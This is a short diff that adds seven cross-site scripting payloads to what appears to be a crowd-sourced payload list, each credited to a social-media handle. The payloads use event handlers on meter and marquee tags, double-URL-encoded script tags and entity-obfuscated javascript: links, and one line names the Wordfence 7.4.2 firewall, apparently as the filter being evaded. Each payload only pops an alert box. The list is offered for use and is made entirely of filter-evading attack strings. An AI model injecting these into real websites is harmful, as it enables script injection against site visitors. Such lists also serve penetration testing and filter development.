@@ -1,0 +1,7 @@
+ax6zt%2522%253e%253cscript%253ealert%2528document.domain%2529%253c%252fscript%253ey6uu6 -@naglinagli
+<meter onmouseover="alert(1)" -@manjith27945363
+'">><div><meter onmouseover="alert(1)"</div>" -@manjith27945363
+>><marquee loop=1 width=0 onfinish=alert(1)> -@manjith27945363
+Wordfence 7.4.2
+<a href=&#01javascript:alert(1)> -@brutelogic
+<a/href=%26%23x6a;%26%23x61;%26%23x76;%26%23x61;%26%23x73;%26%23x63;%26%23x72;%26%23x69;%26%23x70;%26%23x74;%26%23x0a;:alert(1)>please%20click%20here</a>
